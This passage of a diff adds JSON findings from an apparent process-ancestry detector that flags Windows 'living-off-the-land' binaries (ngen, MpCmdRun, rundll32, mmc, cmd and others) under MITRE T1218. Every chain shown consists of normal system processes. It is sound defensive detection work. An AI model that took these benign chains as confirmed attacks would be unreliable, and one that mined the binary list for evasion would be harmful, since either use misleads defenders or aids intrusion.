+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\taskhostw.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngentask.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f10c-624a-7b00-000000000500",
+          "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe",
+          "lolbin_name": "ngen.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\taskhostw.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngentask.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f10f-624a-7c00-000000000500",
+          "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe",
+          "lolbin_name": "ngen.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\taskhostw.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngentask.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f111-624a-7d00-000000000500",
+          "image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe",
+          "lolbin_name": "ngen.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\taskhostw.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngentask.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f111-624a-7e00-000000000500",
+          "image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe",
+          "lolbin_name": "ngen.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\taskhostw.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngentask.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f125-624a-7f00-000000000500",
+          "image": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MpCmdRun.exe",
+          "lolbin_name": "mpcmdrun.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MpCmdRun.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f128-624a-8000-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MpCmdRun.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f129-624a-8100-000000000500",
+          "image": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MpCmdRun.exe",
+          "lolbin_name": "mpcmdrun.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MpCmdRun.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MpCmdRun.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f12a-624a-8200-000000000500",
+          "image": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MpCmdRun.exe",
+          "lolbin_name": "mpcmdrun.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MpCmdRun.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f12a-624a-8300-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MsMpEng.exe",
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2202.4-0\\MpCmdRun.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f156-624a-8700-000000000500",
+          "image": "C:\\Windows\\System32\\wuauclt.exe",
+          "lolbin_name": "wuauclt.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\wuauclt.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f7ad-624a-3502-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\Sysmon64.exe",
+            "C:\\Windows\\Sysmon64.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f7b1-624a-3902-000000000500",
+          "image": "C:\\Windows\\explorer.exe",
+          "lolbin_name": "explorer.exe",
+          "chain_length_nodes": 5,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f7b3-624a-3b02-000000000500",
+          "image": "C:\\Windows\\System32\\ie4uinit.exe",
+          "lolbin_name": "ie4uinit.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\System32\\ie4uinit.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f7b4-624a-3c02-000000000500",
+          "image": "C:\\Windows\\System32\\ie4uinit.exe",
+          "lolbin_name": "ie4uinit.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\System32\\ie4uinit.exe",
+            "C:\\Windows\\System32\\ie4uinit.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f7cf-624a-4e02-000000000500",
+          "image": "C:\\Windows\\System32\\wlrmdr.exe",
+          "lolbin_name": "wlrmdr.exe",
+          "chain_length_nodes": 4,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\wlrmdr.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f7cf-624a-4f02-000000000500",
+          "image": "C:\\Windows\\System32\\mmc.exe",
+          "lolbin_name": "mmc.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\System32\\mmc.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f7e5-624a-5a02-000000000500",
+          "image": "C:\\Windows\\System32\\mmc.exe",
+          "lolbin_name": "mmc.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\System32\\mmc.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f809-624a-7302-000000000500",
+          "image": "C:\\Windows\\System32\\rundll32.exe",
+          "lolbin_name": "rundll32.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\rundll32.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-f823-624a-e102-000000000500",
+          "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe",
+          "lolbin_name": "ngen.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\taskhostw.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngentask.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-fb7c-624a-f504-000000000500",
+          "image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe",
+          "lolbin_name": "ngen.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\taskhostw.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngentask.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-fbea-624a-f804-000000000500",
+          "image": "C:\\Windows\\System32\\rundll32.exe",
+          "lolbin_name": "rundll32.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\rundll32.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-fc21-624a-fa04-000000000500",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "ccee75f4-fc21-624a-fb04-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\winlogon.exe",
+            "C:\\Windows\\System32\\userinit.exe",
+            "C:\\Windows\\explorer.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        }
+      ]
+    }
+  }
+}
